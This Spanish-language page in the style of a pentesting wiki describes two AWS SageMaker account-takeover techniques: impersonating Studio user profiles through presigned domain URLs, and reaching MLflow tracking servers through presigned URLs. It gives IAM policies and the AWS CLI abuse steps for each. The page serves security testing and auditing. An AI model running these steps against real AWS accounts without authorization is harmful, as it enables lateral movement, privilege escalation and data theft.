# AWS - SageMaker Acceso no autorizado

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Secuestro de cuenta via CreatePresignedDomainUrl (Suplantar cualquier UserProfile)

### Descripción
Una identidad con permiso para invocar `sagemaker:CreatePresignedDomainUrl` sobre un `UserProfile` objetivo de Studio puede generar una URL de acceso que autentica directamente en SageMaker Studio como ese perfil. Esto proporciona al navegador del atacante una sesión de Studio que hereda los permisos del `ExecutionRole` del perfil y acceso completo al home respaldado por EFS y a las apps del perfil. No se requiere `iam:PassRole` ni acceso a la consola.

### Requisitos
- Un SageMaker Studio `Domain` y un `UserProfile` objetivo dentro del mismo.
- El principal atacante necesita `sagemaker:CreatePresignedDomainUrl` sobre el `UserProfile` objetivo (a nivel de recurso) o `*`.

Ejemplo mínimo de policy (limitado a un UserProfile):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### Pasos de abuso

1) Enumera un Studio Domain y UserProfiles a los que puedas apuntar
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Generar una presigned URL (válida ~5 minutos por defecto)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) Abra la URL devuelta en un navegador para iniciar sesión en Studio como el usuario objetivo. En un terminal de Jupyter dentro de Studio, verifique la identidad efectiva:
```bash
aws sts get-caller-identity
```
Notas:
- `--landing-uri` puede omitirse. Algunos valores (p. ej., `app:JupyterLab:/lab`) pueden ser rechazados según la variante/versión de Studio; los valores por defecto normalmente redirigen a la página principal de Studio y luego a Jupyter.
- Las políticas de la organización/restricciones de endpoints VPC aún pueden bloquear el acceso a la red; la emisión del token no requiere inicio de sesión en la consola ni `iam:PassRole`.

### Impacto
- Movimiento lateral y escalada de privilegios al asumir cualquier Studio `UserProfile` cuyo ARN esté permitido, heredando su `ExecutionRole` y sistema de archivos/aplicaciones.

### Evidencia (de una prueba controlada)
- Con solo `sagemaker:CreatePresignedDomainUrl` en un `UserProfile` objetivo, el rol atacante devolvió con éxito un `AuthorizedUrl` como:
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- Una solicitud HTTP directa responde con una redirección (HTTP 302) a Studio, confirmando que la URL es válida y está activa hasta su expiración.


## SageMaker MLflow Tracking Server - ATO via CreatePresignedMlflowTrackingServerUrl

### Descripción
Una identidad con permiso para llamar a `sagemaker:CreatePresignedMlflowTrackingServerUrl` para un SageMaker MLflow Tracking Server objetivo puede generar una URL prefirmada de un solo uso que autentica directamente en la interfaz de usuario gestionada de MLflow para ese servidor. Esto concede el mismo acceso que tendría un usuario legítimo al servidor (ver/crear experimentos y ejecuciones, y descargar/subir artefactos en el almacén de artefactos S3 del servidor) sin acceso a la consola ni `iam:PassRole`.

### Requisitos
- Un SageMaker MLflow Tracking Server en la cuenta/región y su nombre.
- El principal atacante necesita `sagemaker:CreatePresignedMlflowTrackingServerUrl` en el recurso MLflow Tracking Server objetivo (o `*`).

Ejemplo de política mínima (limitada a un Tracking Server):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### Pasos de abuso

1) Enumera MLflow Tracking Servers a los que puedas apuntar y elige uno
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) Generar una URL presignada de MLflow UI (válida por poco tiempo)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) Abra la URL devuelta en un navegador para acceder al MLflow UI como usuario autenticado para ese Tracking Server.

Notas:
- El Tracking Server debe estar en un estado listo (p. ej., `Created/Active`). Si aún está `Creating`, la llamada será rechazada.
- La URL prefirmada es de un solo uso y de corta duración; genere una nueva cuando sea necesario.

### Impacto
- Acceso directo al MLflow UI administrado para el Tracking Server objetivo, permitiendo ver y modificar experiments/runs y la recuperación o carga de artifacts almacenados en el S3 artifact store configurado del servidor, dentro de los permisos impuestos por la configuración del servidor.

{{#include ../../../../banners/hacktricks-training.md}}
